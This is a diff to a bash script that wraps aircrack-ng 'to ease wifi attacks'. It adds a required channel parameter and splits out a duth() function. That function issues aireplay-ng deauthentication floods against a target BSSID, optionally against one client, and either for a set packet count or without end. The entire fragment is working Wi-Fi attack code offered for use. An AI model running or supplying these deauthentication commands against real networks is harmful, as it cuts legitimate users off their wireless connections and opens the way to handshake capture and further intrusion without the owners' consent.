@@ -5,21 +5,28 @@
 #	bssid - required (for all types besides recon)
 #	count - optional (set the number deauth pkg sent, default is until stoped)
 #	client - optional (set a specific client for deauth)
+#	channel - required (set the channel of AP (required cause sometimes aireplay-ng doesn't get the right channel))
 #end_op
 #str_info
 #	This is a aircrack-ng wrapper made in bash to ease wifi attacks
 #end_info
 
+ch=$channel
+
 duth_attk() {
 	mon_md
+	duth
+}
+
+duth() {
 	if [[ -z $client && -z $count ]]; then
-		sudo aireplay-ng --deauth 0 -a $bssid $ifacemon
+		sudo aireplay-ng --deauth 0 -a $bssid --channel $ch $ifacemon
 	elif [[ -n $client && -z $count ]]; then
-		sudo aireplay-ng --deauth 0 -a $bssid -c $client $ifacemon
+		sudo aireplay-ng --deauth 0 -a $bssid -c $client --channel $ch $ifacemon
 	elif [[ -n $client && -n $count ]]; then
-		sudo aireplay-ng --deauth $count -a $bssid -c $client $ifacemon
+		sudo aireplay-ng --deauth $count -a $bssid -c $client --channel $ch $ifacemon
 	elif [[ -z $client && -n $count ]]; then
-		sudo aireplay-ng --deauth $count -a $bssid $ifacemon
+		sudo aireplay-ng --deauth $count -a $bssid --channel $ch $ifacemon
 	fi
 	
 	
